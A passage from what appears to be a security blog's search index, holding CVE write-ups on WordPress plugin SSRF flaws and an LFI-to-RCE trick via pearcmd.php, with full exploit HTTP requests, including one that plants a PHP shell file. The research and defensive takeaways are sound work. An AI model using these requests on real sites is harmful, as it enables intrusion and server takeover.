POC","uri":"/posts/2025-10-23-cve-2023-36679/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Local Server Create a simple local service with python from flask import Flask, jsonify, request, send_from_directory import os BASE_DIR = os.path.abspath(os.getcwd()) app = Flask(__name__) @app.route('/test') def test(): return send_from_directory(BASE_DIR, 'metadata.json', as_attachment=True) if __name__ == '__main__': app.run(host='0.0.0.0', port=8001, debug=True) ","date":"2025-10-23","objectID":"/posts/2025-10-23-cve-2023-36679/:4:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2023-36679 Analysis \u0026 POC","uri":"/posts/2025-10-23-cve-2023-36679/#local-server"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Create a post and obtain the _ajax_nonce Send a request with api_uri pointing to the local service http://127.0.0.1:8001/test as a Contributor user POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0 Accept: application/json, text/javascript, */*; q=0.01 Cookie: wordpress_86a9106ae65537651a8e456835b316ab=con%7C1761196421%7CqXmKZUf4pSlgQ1P9tEQA71pnVWLNanpuqdHLXAZXyFJ%7Cf3dc677b2e483f598ad00a36fbd2f18ed1ed5015b39fc2df533aeb573a8dc3fd; wp-settings-time-2=1761027443; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=con%7C1761196421%7CqXmKZUf4pSlgQ1P9tEQA71pnVWLNanpuqdHLXAZXyFJ%7C1e8333233a2233576e988302d4f19d5c92470de4cc2bf4c1e31fb65788a44d35 action=ast_block_templates_importer\u0026_ajax_nonce=3ef4c6d6df\u0026api_uri=http://127.0.0.1:8001/test Result: Read content from local service ","date":"2025-10-23","objectID":"/posts/2025-10-23-cve-2023-36679/:4:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2023-36679 Analysis \u0026 POC","uri":"/posts/2025-10-23-cve-2023-36679/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion Version ≤ 2.6.6 of the Spectra (Ultimate Addons for Gutenberg) plugin contains an SSRF vulnerability due to using wp_remote_get() with a URL supplied by the user without restricting or validating its source. This allows an account with Contributor privileges to force the WordPress server to make requests to internal addresses. ","date":"2025-10-23","objectID":"/posts/2025-10-23-cve-2023-36679/:4:3","tags":["analyst","plugin","ssrf"],"title":"CVE-2023-36679 Analysis \u0026 POC","uri":"/posts/2025-10-23-cve-2023-36679/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key takeaways Do not trust URLs from the client; only use data available on the server. Prefer wp_safe_remote_get() over wp_remote_get(). Check HTTP response (status, MIME, content). Restrict who can make request calls to the minimum required role. ","date":"2025-10-23","objectID":"/posts/2025-10-23-cve-2023-36679/:4:4","tags":["analyst","plugin","ssrf"],"title":"CVE-2023-36679 Analysis \u0026 POC","uri":"/posts/2025-10-23-cve-2023-36679/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References SSRF (Server Side Request Forgery) — Hacktrick WordPress Spectra Plugin \u003c= 2.6.6 is vulnerable to Server Side Request Forgery (SSRF) ","date":"2025-10-23","objectID":"/posts/2025-10-23-cve-2023-36679/:5:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2023-36679 Analysis \u0026 POC","uri":"/posts/2025-10-23-cve-2023-36679/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Technical analysis and proof-of-concept demonstrating an LFI bypass (forced .php suffix) leveraging pearcmd.php","date":"2025-10-22","objectID":"/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/","tags":["analyst","lfi","plugin","pearcmd"],"title":"Exploiting LFI2RCE Vulnerability via PHP PEARCMD","uri":"/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/"},{"categories":["CVE Analysis"],"collections":null,"content":"Hello. After analyzing 10 CVEs related to LFI in WordPress plugins, I noticed a common barrier: many exploitation vectors are constrained by the requirement to have a .php suffix. This significantly reduces exploitability. During my research I found the article docker-php-include-getshell. That article describes a way to bypass the .php constraint by abusing the pearcmd.php file which is part of PHP’s PECL/PEAR toolkit and is present in WordPress environments deployed on Docker — a very practical trick for no-upload scenarios. ","date":"2025-10-22","objectID":"/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/:0:0","tags":["analyst","lfi","plugin","pearcmd"],"title":"Exploiting LFI2RCE Vulnerability via PHP PEARCMD","uri":"/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/#"},{"categories":["CVE Analysis"],"collections":null,"content":"What are PEAR and PECL? PECL (PHP Extension Community Library): a command-line tool to install and manage PHP extensions. PEAR (PHP Extension and Application Repository): the library platform used by PECL. Before PHP 7.3, PEAR/PECL were often installed by default. From PHP 7.4 onward, PHP must be compiled with --with-pear to include them. However, in official PHP Docker images, PEAR/PECL are still often included, located under /usr/local/lib/php: root@e182501c47c4:/var/www/html# ls /usr/local/lib/php Archive Console OS PEAR PEAR.php Structures System.php XML build data doc extensions pearcmd.php peclcmd.php test ","date":"2025-10-22","objectID":"/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/:1:0","tags":["analyst","lfi","plugin","pearcmd"],"title":"Exploiting LFI2RCE Vulnerability via PHP PEARCMD","uri":"/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/#what-are-pear-and-pecl"},{"categories":["CVE Analysis"],"collections":null,"content":"pearcmd.php and register_argc_argv pearcmd.php is a PHP script designed to run in CLI mode, for example: php /usr/local/lib/php/pearcmd.php install somepackage It processes arguments from $argv and $argc. When run as CLI this data is obvious. If this file is included in a web context (via LFI), its CLI logic can be abused. The key point is the register_argc_argv setting. If register_argc_argv = On, PHP will populate: $argc $argv $_SERVER['argv'] `argv` in PHP configuration When WordPress is set up on Docker, register_argc_argv is often enabled by default. The question becomes: when PHP runs under a web SAPI (FPM/Apache) and not in CLI, where does $argv come from? ","date":"2025-10-22","objectID":"/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/:2:0","tags":["analyst","lfi","plugin","pearcmd"],"title":"Exploiting LFI2RCE Vulnerability via PHP PEARCMD","uri":"/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/#pearcmdphp-and-register_argc_argv"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis of PHP Source Code In the PHP core there is logic like: if (PG(register_argc_argv)) { if (SG(request_info).argc) { ... } else { php_build_argv(SG(request_info).query_string, \u0026PG(http_globals)[TRACK_VARS_SERVER]); } } If there is no argc (not running CLI), PHP calls php_build_argv with SG(request_info).query_string — i.e., the URL’s query string. For example: http://example.com/index.php?a=b\u0026c=d → query_string = \"a=b\u0026c=d\" PHP will use this query string to build the argv variables, so $_SERVER['argv'] can be influenced by the query string. Consequence: When pearcmd.php is included via LFI in a web environment where $_SERVER['argv'] is generated from the query string, an attacker can control the command-line parameters that pearcmd.php reads. Thus, PEAR/PECL command functionality can be abused via the web to perform unwanted actions. ","date":"2025-10-22","objectID":"/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/:3:0","tags":["analyst","lfi","plugin","pearcmd"],"title":"Exploiting LFI2RCE Vulnerability via PHP PEARCMD","uri":"/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/#analysis-of-php-source-code"},{"categories":["CVE Analysis"],"collections":null,"content":"RFC3875 Explain RFC3875 (the CGI spec) defines a form of “indexed” HTTP query — that is, a query string without unencoded = characters sent via GET or HEAD. When encountering such a query, the server SHOULD treat the query-string as a search-string, splitting it into search-words separated by +: search-string = search-word ( \"+\" search-word ) search-word = 1*schar After splitting, each search-word is URL-decoded, optionally re-encoded as system-defined, then added to the command-line argument list (argv) of the CGI program. In short: if the query-string contains no = and is a GET or HEAD request, the server may treat parts separated by + as arguments and pass them into argv. RFC3875 allows a server to turn an “indexed” query-string (GET/HEAD, no unencoded =) into an argv list. The spec excerpt: 4.4. The Script Command Line Some systems support a method for supplying an array of strings to the CGI script. This is only used in the case of an 'indexed' HTTP query, which is identified by a 'GET' or 'HEAD' request with a URI query string that does not contain any unencoded \"=\" characters. For such a request, the server SHOULD treat the query-string as a search-string and parse it into words, using the rules search-string = search-word ( \"+\" search-word ) search-word = 1*schar schar = unreserved | escaped | xreserved xreserved = \";\" | \"/\" | \"?\" | \":\" | \"@\" | \"\u0026\" | \"=\" | \",\" | \"$\" After parsing, each search-word is URL-decoded, optionally encoded in a system-defined manner and then added to the command line argument list. PHP previously had a vulnerability related to this (CVE-2012-1823). Today, PHP handles the query-string more broadly than RFC suggests — even when the query-string contains =, it can still be added to $_SERVER['argv']. PHP still adds query strings containing '=' into $_SERVER\\['argv'] 👉 By passing a query string like ?a+b+c+..., PHP will split on + and create $_SERVER['argv'] as an array ['a', 'b', 'c', ...], consistent with RFC3875 semantics. ","date":"2025-10-22","objectID":"/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/:4:0","tags":["analyst","lfi","plugin","pearcmd"],"title":"Exploiting LFI2RCE Vulnerability via PHP PEARCMD","uri":"/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/#rfc3875-explain"},{"categories":["CVE Analysis"],"collections":null,"content":"Testing PEAR in CLI The author’s article mentions a payload related to config-create, described as used to create a configuration file. Description of config-create When I tried running the command on CLI: root@e182501c47c4:/var/www/html# php /usr/local/lib/php/pearcmd.php config-create config-create: must have 2 parameters, root path and filename to save as When not enough parameters are provided, the program errors and requires two mandatory parameters: root path: the root directory PEAR uses for package installation and configuration lookup. filename: the filename to save the configuration as. Trying with parameters: root@e182501c47c4:/var/www/html# php /usr/local/lib/php/pearcmd.php config-create test_root_path test_filename.php Root directory must be an absolute path beginning with \"/\", was: \"test_root_path\" Here PEAR insists test_root_path must be an absolute path starting with /. Running again with a valid path: root@e182501c47c4:/var/www/html# php /usr/local/lib/php/pearcmd.php config-create /test_root_path test_filename.php The returned output: Configuration (channel pear.php.net): ===================================== Auto-discover new Channels auto_discover \u003cnot set\u003e Default Channel default_channel pear.php.net HTTP Proxy Server Address http_proxy \u003cnot set\u003e PEAR server [DEPRECATED] master_server \u003cnot set\u003e Default Channel Mirror preferred_mirror \u003cnot set\u003e Remote Configuration File remote_config \u003cnot set\u003e PEAR executables directory bin_dir /test_root_path/pear PEAR documentation directory doc_dir /test_root_path/pear/docs PHP extension directory ext_dir /test_root_path/pear/ext PEAR directory php_dir /test_root_path/pear/php PEAR Installer cache directory cache_dir /test_root_path/pear/cache PEAR configuration file cfg_dir /test_root_path/pear/cfg directory PEAR data directory data_dir /test_root_path/pear/data PEAR Installer download download_dir /test_root_path/pear/download directory Systems manpage files man_dir /test_root_path/pear/man directory PEAR metadata directory metadata_dir \u003cnot set\u003e PHP CLI/CGI binary php_bin \u003cnot set\u003e php.ini location php_ini \u003cnot set\u003e --program-prefix passed to php_prefix \u003cnot set\u003e PHP's ./configure --program-suffix passed to php_suffix \u003cnot set\u003e PHP's ./configure PEAR Installer temp directory temp_dir /test_root_path/pear/temp PEAR test directory test_dir /test_root_path/pear/tests PEAR www files directory www_dir /test_root_path/pear/www Cache TimeToLive cache_ttl \u003cnot set\u003e Preferred Package State preferred_state \u003cnot set\u003e Unix file mask umask \u003cnot set\u003e Debug Log Level verbose \u003cnot set\u003e PEAR password (for password \u003cnot set\u003e maintainers) Signature Handling Program sig_bin \u003cnot set\u003e Signature Key Directory sig_keydir \u003cnot set\u003e Signature Key Id sig_keyid \u003cnot set\u003e Package Signature Type sig_type \u003cnot set\u003e PEAR username (for username \u003cnot set\u003e maintainers) User Configuration File Filename /var/www/html/test_filename.php System Configuration File Filename #no#system#config# Successfully created default configuration file \"/usr/www/html/test_filename.php\" The result shows child paths for each type of data being auto-generated under /test_root_path/pear. On the last line: Successfully created default configuration file \"/usr/www/html/test_filename.php\" The configuration file was created in the current working directory, not under root_path. This is PEAR’s default behavior: root_path only affects the layout of install directories, not the location of the saved config file. When accessing the file \"/var/www/html/test_filename.php\" via a browser: Contents of test_filename.php rendered in the browser The created file contains information about test_root_path, presented in serialize format. However, that was the CLI execution path. For web exploitation, one must analyze the source to see how the program accepts and processes parameters passed in. ","date":"2025-10-22","objectID":"/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/:5:0","tags":["analyst","lfi","plugin","pearcmd"],"title":"Exploiting LFI2RCE Vulnerability via PHP PEARCMD","uri":"/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/#testing-pear-in-cli"},{"categories":["CVE Analysis"],"collections":null,"content":"pearcmd Code Analysis Before analyzing /usr/local/lib/php/pearcmd.php, it’s useful to set up a debugging environment to observe execution flow — see: https://w41bu1.github.io/2025-10-22-wordpress-local-and-debugging-docker/ Then copy all PHP source from the container to a local machine, preserving directory structure, so when the debugger stops at /usr/local/lib/php/pearcmd.php you can open and inspect the corresponding file from the container: sudo docker cp wordpress:/usr/local/lib/php/ /usr/local/lib/php/ /usr/local/lib/php/pearcmd.php require_once 'PEAR.php'; require_once 'PEAR/Frontend.php'; require_once 'PEAR/Config.php'; require_once 'PEAR/Command.php'; require_once 'Console/Getopt.php'; $all_commands = PEAR_Command::getCommands(); ... $argv = Console_Getopt::readPHPArgv(); ... $options = Console_Getopt::getopt2($argv, \"c:C:d:D:Gh?sSqu:vV\"); array_shift($argv); ... $command = (isset($options[1][0])) ? $options[1][0] : null; ... if ($fetype == 'Gtk2') { ... } else { do { ... $cmd = PEAR_Command::factory($command, $config); ... list($tmpopt, $params) = $tmp; ... $ok = $cmd-\u003erun($command, $opts, $params); if ($ok === false) { PEAR::raiseError(\"unknown command `$command'\"); } ... } while (false); } First, all commands are loaded into $all_commands: $all_commands = PEAR_Command::getCommands(); /usr/local/lib/php/PEAR/Command.php public static function getCommands() { if (empty($GLOBALS['_PEAR_Command_commandlist'])) { PEAR_Command::registerCommands(); } return $GLOBALS['_PEAR_Command_commandlist']; } getCommands() calls registerCommands() to register the commands. All commands are loaded into `$all_commands` Then $argv is initialized: $argv = Console_Getopt::readPHPArgv(); php/Console/Getopt.php public static function readPHPArgv() { global $argv; if (!is_array($argv)) { if (!@is_array($_SERVER['argv'])) { if (!@is_array($GLOBALS['HTTP_SERVER_VARS']['argv'])) { $msg = \"Could not read cmd args (register_argc_argv=Off?)\"; return PEAR::raiseError(\"Console_Getopt: \" . $msg); } return $GLOBALS['HTTP_SERVER_VARS']['argv']; } return $_SERVER['argv']; } return $argv; } If $argv is not an array (i.e., no valid data), the function tries to find the equivalent in $_SERVER['argv'] and return it — that is, the search-word parts we pass in the URL. Example: GET /wp-admin/admin-ajax.php?action=geo_mashup_query\u0026object_ids=2\u0026template=../../../../../../../usr/local/lib/php/pearcmd\u0026+config-create+/test_root_path+test_filename.php HTTP/1.1 Observed in the debugger: Value of `$argv` in the debugger Next $argv has its first element removed and is passed to Console_Getopt::getopt2(), the return value assigned to $options: array_shift($argv); $options = Console_Getopt::getopt2($argv, \"c:C:d:D:Gh?sSqu:vV\"); The value is now: Values of `$argv` and `$options` in the debugger The $command variable is initialized from $options[1][0], in this case config-create. $command = (isset($options[1][0])) ? $options[1][0] : null; Then a factory is created and assigned to $cmd: $cmd = PEAR_Command::factory($command, $config); Hovering $cmd shows the required parameters for the config-create command. Required parameters for the `config-create` command Notably, the execution function for config-create is doConfigCreate: /usr/local/lib/php/PEAR/Command.php function doConfigCreate($command, $options, $params) { if (count($params) != 2) { return PEAR::raiseError('config-create: must have 2 parameters, root path and ' . 'filename to save as'); } $root = $params[0]; // Clean up the DIRECTORY_SEPARATOR mess $ds2 = DIRECTORY_SEPARATOR . DIRECTORY_SEPARATOR; $root = preg_replace(array('!\\\\\\\\+!', '!/+!', \"!$ds2+!\"), array('/', '/', '/'), $root); if ($root[0] != '/') { if (!isset($options['windows'])) { return PEAR::raiseError('Root directory must be an absolute path beginning ' . 'with \"/\", was: \"' . $root . '\"'); } if (!preg_match('/^[A-Za-z]:/', $root)) { return PEAR::raiseError('Root directory must be an absolute path beginning ' . 'with \"\\\\\" or \"C:\\\\\", was: \"' . $root . ","date":"2025-10-22","objectID":"/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/:6:0","tags":["analyst","lfi","plugin","pearcmd"],"title":"Exploiting LFI2RCE Vulnerability via PHP PEARCMD","uri":"/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/#pearcmd-code-analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow Send a GET request: GET /wp-admin/admin-ajax.php?action=geo_mashup_query\u0026object_ids=2\u0026template=../../../../../../../usr/local/lib/php/pearcmd\u0026+config-create+/test_root_path+test_filename.php The web app includes /usr/local/lib/php/pearcmd.php. PHP (with register_argc_argv=On) builds $_SERVER['argv'] from the query → ['action=geo_mashup_query\u0026object_ids=2\u0026template=../../../../../../../usr/local/lib/php/pearcmd\u0026','config-create','/test_root_path','test_filename.php']. Console_Getopt::readPHPArgv() returns $argv; Console_Getopt::getopt2() parses and yields $command='config-create' and list($tmpopt, $params) gives $params=['/test_root_path','test_filename.php']. doConfigCreate() runs with $params controlled by the attacker → touch()/realpath() and writeConfigFile() create/write the file. Info The created config file contains the root path value. If this value is written as a valid PHP tag (\u003c?php ... ?\u003e) and the file is accessible by the client, the webserver will process the PHP content in that file and the code will be executed, leading to RCE. ","date":"2025-10-22","objectID":"/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/:7:0","tags":["analyst","lfi","plugin","pearcmd"],"title":"Exploiting LFI2RCE Vulnerability via PHP PEARCMD","uri":"/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit Leveraging CVE-2025-48293 analyzed earlier to expand into an exploit via pearcmd.php Send a request with an LFI payload pointing to pearcmd.php: GET /wp-admin/admin-ajax.php?action=geo_mashup_query\u0026object_ids=2\u0026template=../../../../../../../usr/local/lib/php/pearcmd\u0026+config-create+/\u003c?=phpinfo();?\u003e+/var/www/html/shell.php HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Referer: http://localhost/wp-admin/ Connection: keep-alive Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: same-origin Sec-Fetch-User: ?1 X-PwnFox-Color: blue Priority: u=0, i Successful response returned: Successful response Accessing shell.php: shell.php ","date":"2025-10-22","objectID":"/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/:8:0","tags":["analyst","lfi","plugin","pearcmd"],"title":"Exploiting LFI2RCE Vulnerability via PHP PEARCMD","uri":"/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Essential Blocks for Gutenberg Plugin.","date":"2025-10-22","objectID":"/posts/2025-10-22-cve-2025-11361/","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11361 Analysis \u0026 POC","uri":"/posts/2025-10-22-cve-2025-11361/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info The Gutenberg Essential Blocks – Page Builder for Gutenberg Blocks \u0026 Patterns plugin for WordPress is vulnerable to Server-Side Request Forgery (SSRF) in all versions up to and including 5.7.1, via the function eb_save_ai_generated_image. This allows an authenticated attacker with Author-level privileges or higher to perform web requests to arbitrary addresses from the web application, and can be abused to query and exfiltrate information from internal services. CVE ID: CVE-2025-11361 Vulnerability Type: Server Side Request Forgery (SSRF) Affected Versions: \u003c= 5.7.1 Patched Versions: 5.7.2 CVSS severity: Low (5.5) Required Privilege: Author Product: WordPress Essential Blocks for Gutenberg Plugin ","date":"2025-10-22","objectID":"/posts/2025-10-22-cve-2025-11361/:1:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11361 Analysis \u0026 POC","uri":"/posts/2025-10-22-cve-2025-11361/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Essential Blocks for Gutenberg: 5.7.1 (vulnerable) and 5.7.2 (patched). Diff tool - Meld or any diff/comparison tool to inspect differences between the two versions. ","date":"2025-10-22","objectID":"/posts/2025-10-22-cve-2025-11361/:2:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11361 Analysis \u0026 POC","uri":"/posts/2025-10-22-cve-2025-11361/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis ","date":"2025-10-22","objectID":"/posts/2025-10-22-cve-2025-11361/:3:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11361 Analysis \u0026 POC","uri":"/posts/2025-10-22-cve-2025-11361/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff Vulnerable code: public function eb_save_ai_generated_image() { if ( ! isset( $_POST[ 'admin_nonce' ] ) || ! wp_verify_nonce( sanitize_key( $_POST[ 'admin_nonce' ] ), 'admin-nonce' ) ) { wp_send_json_error( __( 'Nonce Error', 'essential-blocks' ) ); } if ( ! current_user_can( 'upload_files' ) ) { wp_send_json_error( __( 'You are not authorized to upload files!', 'essential-blocks' ) ); } // Check if we have either image_url or image_b64 along with prompt if ( ( isset( $_POST[ 'image_url' ] ) || isset( $_POST[ 'image_b64' ] ) ) \u0026\u0026 isset( $_POST[ 'prompt' ] ) ) { $image_url = isset( $_POST[ 'image_url' ] ) ? esc_url_raw( $_POST[ 'image_url' ] ) : null; $image_body = ''; // Handle URL format if ( $image_url ) { // Download the image from OpenAI URL $image_data = wp_remote_get( $image_url, [ 'timeout' =\u003e 60 ] ); if ( is_wp_error( $image_data ) ) { wp_send_json_error( [ 'message' =\u003e __( 'Failed to download image from OpenAI.', 'essential-blocks' ) ] ); return; } // Detect image format and set appropriate extension and MIME type $image_info = getimagesizefromstring( $image_body ); $mime_type = $image_info ? $image_info[ 'mime' ] : 'image/png'; // Determine file extension based on MIME type $extension = 'png'; // default switch ( $mime_type ) { case 'image/jpeg': $extension = 'jpg'; break; case 'image/png': $extension = 'png'; break; case 'image/webp': $extension = 'webp'; break; case 'image/gif': $extension = 'gif'; break; } $image_body = wp_remote_retrieve_body( $image_data ); } // other logic } else { wp_send_json_error( __( 'Image data (URL or base64) and prompt are required', 'essential-blocks' ) ); } } In the vulnerable version, the code uses wp_remote_get($image_url) to download an image without validating or restricting the source URL. It does not check the HTTP response code, the MIME type, or the actual content of the returned file, allowing an attacker to abuse this to perform SSRF to internal services or to download malicious content disguised as an image. Patched code: public function eb_save_ai_generated_image() { if ( ! isset( $_POST[ 'admin_nonce' ] ) || ! wp_verify_nonce( sanitize_key( $_POST[ 'admin_nonce' ] ), 'admin-nonce' ) ) { wp_send_json_error( __( 'Nonce Error', 'essential-blocks' ) ); } if ( ! current_user_can( 'upload_files' ) ) { wp_send_json_error( __( 'You are not authorized to upload files!', 'essential-blocks' ) ); } // Check if we have either image_url or image_b64 along with prompt if ( ( isset( $_POST[ 'image_url' ] ) || isset( $_POST[ 'image_b64' ] ) ) \u0026\u0026 isset( $_POST[ 'prompt' ] ) ) { $image_url = isset( $_POST[ 'image_url' ] ) ? esc_url_raw( $_POST[ 'image_url' ] ) : null; $image_body = ''; // Handle URL format if ( $image_url ) { // Download the image from validated URL $image_data = wp_safe_remote_get( $image_url, [ 'timeout' =\u003e 30, 'redirection' =\u003e 3, 'user-agent' =\u003e 'Essential Blocks/' . ESSENTIAL_BLOCKS_VERSION, 'headers' =\u003e [ 'Accept' =\u003e 'image/*' ] ] ); if ( is_wp_error( $image_data ) ) { wp_send_json_error( [ 'message' =\u003e __( 'Failed to download image from URL.', 'essential-blocks' ) ] ); return; } // Validate response $response_code = wp_remote_retrieve_response_code( $image_data ); if ( $response_code !== 200 ) { wp_send_json_error( [ 'message' =\u003e __( 'Invalid response from image URL.', 'essential-blocks' ) ] ); return; } // Security: Validate image content and size if ( ! $this-\u003eis_valid_image_content( $image_body ) ) { wp_send_json_error( [ 'message' =\u003e __( 'Invalid image content provided.', 'essential-blocks' ) ] ); return; } // Detect image format and set appropriate extension and MIME type $image_info = getimagesizefromstring( $image_body ); if ( ! $image_info ) { wp_send_json_error( [ 'message' =\u003e __( 'Unable to determine image format.', 'essential-blocks' ) ] ); return; } $mime_type = $image_info[ 'mime' ]; // Security: Only allow specific image MIME types $allowed_mime_types = [ 'image/jpeg', 'image/png', 'image/webp', 'image/gif' ]; if ( ! in_array( $mime_type, $all","date":"2025-10-22","objectID":"/posts/2025-10-22-cve-2025-11361/:3:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11361 Analysis \u0026 POC","uri":"/posts/2025-10-22-cve-2025-11361/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code eb_save_ai_generated_image() is registered as the callback for the action hook wp_ajax_save_ai_generated_image: add_action( 'wp_ajax_save_ai_generated_image', [ $this, 'eb_save_ai_generated_image' ] ); Thus, when accessing the endpoint /wp-admin/admin-ajax.php with the parameter action=save_ai_generated_image, eb_save_ai_generated_image() will be invoked. To reach the wp_remote_get() execution, the following conditions must be met: Check admin_nonce if ( ! isset( $_POST[ 'admin_nonce' ] ) || ! wp_verify_nonce( sanitize_key( $_POST[ 'admin_nonce' ] ), 'admin-nonce' ) ) { wp_send_json_error( __( 'Nonce Error', 'essential-blocks' ) ); } By default, when accessing wp-admin, admin_nonce will be set and can be found by inspecting the code and searching for the admin_nonce keyword. Find admin_nonce by inspecting the code Check user-level if ( ! current_user_can( 'upload_files' ) ) { wp_send_json_error( __( 'You are not authorized to upload files!', 'essential-blocks' ) ); } The upload_files capability requires the user to be Author-level or higher. POST request contains image_url and prompt params. if ( ( isset( $_POST[ 'image_url' ] ) || isset( $_POST[ 'image_b64' ] ) ) \u0026\u0026 isset( $_POST[ 'prompt' ] ) ) ","date":"2025-10-22","objectID":"/posts/2025-10-22-cve-2025-11361/:3:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11361 Analysis \u0026 POC","uri":"/posts/2025-10-22-cve-2025-11361/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit ","date":"2025-10-22","objectID":"/posts/2025-10-22-cve-2025-11361/:4:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11361 Analysis \u0026 POC","uri":"/posts/2025-10-22-cve-2025-11361/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Local Server Create a simple local service using Python: from flask import Flask, jsonify, request, send_from_directory import os BASE_DIR = os.path.abspath(os.getcwd()) app = Flask(__name__) @app.route('/test') def test(): return send_from_directory(BASE_DIR, 'requirements.txt', as_attachment=True) if __name__ == '__main__': app.run(host='0.0.0.0', port=8001, debug=True) hello ","date":"2025-10-22","objectID":"/posts/2025-10-22-cve-2025-11361/:4:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11361 Analysis \u0026 POC","uri":"/posts/2025-10-22-cve-2025-11361/#local-server"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Send a request with image_url pointing to a local service http://127.0.0.1:8001/test as an Author user: POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Referer: http://localhost/wp-login.php?loggedout=true\u0026wp_lang=en_US Connection: keep-alive Cookie: wordpress_86a9106ae65537651a8e456835b316ab=auth%7C1761189920%7CaUULiwmj9KXCapzU3Q82L7W45WcbXbqHowa8a6yQ2Vz%7C3cc12be38f8f94048309b7fcd31bd2187065311afecea7df5a9f01f5a207072b; wordpress_test_cookie=WP%20Cookie%20check; wp_lang=en_US; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=auth%7C1761189920%7CaUULiwmj9KXCapzU3Q82L7W45WcbXbqHowa8a6yQ2Vz%7C38f09626eae6d08f6cdb9cd1ce781da26c2acdd8ef2fd1822d84a6d76c6c95ad; wp-settings-time-4=1761017121 action=save_ai_generated_image\u0026admin_nonce=9433571df4\u0026prompt=abc\u0026image_url=http://127.0.0.1:8001/test Response: Result: Read the stored file at http://localhost/wp-content/uploads/2025/10/ai-generated-abc-1761019403.png using BurpSuite Content read from the local service Information The content cannot be properly viewed in a browser because the content inside ai-generated-abc-1761019403.png ('hello') does not match the Content-Type: image/png returned, so the browser produces a rendering error. ","date":"2025-10-22","objectID":"/posts/2025-10-22-cve-2025-11361/:4:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11361 Analysis \u0026 POC","uri":"/posts/2025-10-22-cve-2025-11361/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion Versions ≤ 5.7.1 of Essential Blocks for Gutenberg are vulnerable to SSRF because they use wp_remote_get() to fetch uncontrolled URLs, allowing an Author user to send requests to internal addresses. The patch in 5.7.2 uses wp_safe_remote_get(), adds response code checks, validates MIME and image content, and thus mitigates SSRF. ","date":"2025-10-22","objectID":"/posts/2025-10-22-cve-2025-11361/:4:3","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11361 Analysis \u0026 POC","uri":"/posts/2025-10-22-cve-2025-11361/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key takeaways Update immediately to v5.7.2. Use wp_safe_remote_get() instead of wp_remote_get(). Always validate responses (HTTP code, MIME, content). Limit 